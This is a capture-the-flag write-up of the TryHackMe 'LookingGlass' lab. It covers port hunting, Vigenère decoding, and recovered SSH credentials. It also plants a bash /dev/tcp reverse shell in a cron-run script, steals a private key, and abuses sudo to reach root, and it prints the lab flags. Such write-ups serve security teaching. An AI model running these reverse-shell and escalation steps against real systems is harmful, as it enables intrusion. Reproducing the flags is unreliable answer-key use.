# LookingGlass
## IP 10.10.161.246
# TASK 1 - Looking glass

+ Get the user flag. `thm{65d3710e9d75d5f346d2bac669119a23}`
+ Get the root flag. `thm{bc2337b6f97d057b01da718ced6ead3f}`


+ Gathering information menggunakan `nmap -sC -sV 10.10.161.246 -oN nmap_scan`
    - Port Open `9000-13783` SSH Dropbear
    - Problem with mac ssh `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa StrictHostKeyChecking=no`
    - `ssh -p 13783 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no 10.10.161.246`

    - Trying to brute the PORT
    9000    => Lower
    10000   => Lower
    11000   => Lower
    12000   => Lower
    12250   => Lower
    12255   => 
    ```bash
    You've found the real service.
    Solve the challenge to get access to the box
    Jabberwocky
    .... `secret.txt`
    ```
    12260   => Higher
    12275   => Higher
    12300   => Higher
    12400   => Higher
    12500   => Higher
    13000   => Higher
    13783   => Higher

    decode the Vigenere secret with key `THEALPHABETCIPHER`
    ```bash
    'Twas brillig, and the slithy toves
    Did gyre and gimble in the wabe;
    All mimsy were the borogoves,
    And the mome raths outgrabe.

    'Beware the Jabberwock, my son!
    The jaws that bite, the claws that catch!
    Beware the Jubjub bird, and shun
    The frumious Bandersnatch!'

    He took his vorpal sword in hand:
    Long time the manxome foe he sought--
    So rested he by the Tumtum tree,
    And stood awhile in thought.

    And as in uffish thought he stood,
    The Jabberwock, with eyes of flame,
    Came whiffling through the tulgey wood,
    And burbled as it came!

    One, two! One, two! And through and through
    The vorpal blade went snicker-snack!
    He left it dead, and with its head
    He went galumphing back.

    'And hast thou slain the Jabberwock?
    Come to my arms, my beamish boy!
    O frabjous day! Callooh! Callay!'
    He chortled in his joy.

    'Twas brillig, and the slithy toves
    Did gyre and gimble in the wabe;
    All mimsy were the borogoves,
    And the mome raths outgrabe.

    Your secret is bewareTheJabberwock

    Enter Secret:
    jabberwock:SieveAdditionAwkwardSawing
    Connection to 10.10.161.246 closed.
    ```

+ Got Credential `jabberwock:SieveAdditionAwkwardSawing`
    - `ssh jabberwock@10.10.161.246`
    ```bash 
    Last login: Fri Jul  3 03:05:33 2020 from 192.168.170.1
    jabberwock@looking-glass:~$ cat user.txt  | rev
    thm{65d3710e9d75d5f346d2bac669119a23}
    ```

+ Escalation Priviledge
    - Enumeration User
    ```
    jabberwock@looking-glass:~$ ls -la /home
    total 32
    drwxr-xr-x  8 root         root         4096 Jul  3  2020 .
    drwxr-xr-x 24 root         root         4096 Jul  2  2020 ..
    drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice
    drwx------  2 humptydumpty humptydumpty 4096 Jul  3  2020 humptydumpty
    drwxrwxrwx  5 jabberwock   jabberwock   4096 Jul  3  2020 jabberwock
    drwx------  5 tryhackme    tryhackme    4096 Jul  3  2020 tryhackme
    drwx------  3 tweedledee   tweedledee   4096 Jul  3  2020 tweedledee
    drwx------  2 tweedledum   tweedledum   4096 Jul  3  2020 tweedledum


    jabberwock@looking-glass:~$ sudo -l
    Matching Defaults entries for jabberwock on looking-glass:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User jabberwock may run the following commands on looking-glass:
        (root) NOPASSWD: /sbin/reboot
    ```

    
    `@reboot tweedledum bash /home/jabberwock/twasBrillig.sh`

    abuse the file twasBrillig.sh to contains reverse shell
    ```bash
    jabberwock@looking-glass:~$ vim /home/jabberwock/twasBrillig.sh

    #!/bin/bash
    bash -i >& /dev/tcp/10.4.37.160/1234 0>&1
    wall $(cat /home/jabberwock/poem.txt)

    jabberwock@looking-glass:~$ reboot
    ```
    
    - Listening from reboot to activate reverse shell
    ```bash
    hengkisirait: LookingGlass $ nc -l 1234
    bash: cannot set terminal process group (875): Inappropriate ioctl for device
    bash: no job control in this shell
    tweedledum@looking-glass:~$
    ```

    - Unhex the humtydumpty.txt got `the password is zyxwvutsrqponmlk`
    - /usr/bin/script -qc /bin/bash /dev/null

    ```bash
    tweedledee@looking-glass:/dev/shm$ su humptydumpty
    Password:
    humptydumpty@looking-glass:/dev/shm$

    cat /home/alice/.ssh/id_rsa 
    ssh -i alice_id_rsa alice@10.10.161.246

    alice@looking-glass:/etc/sudoers.d$ cat alice
    alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
    sudo -h ssalg-gnikool

    root@looking-glass:/root# cat root.txt
    }f3dae6dec817ad10b750d79f6b7332cb{mht
    ```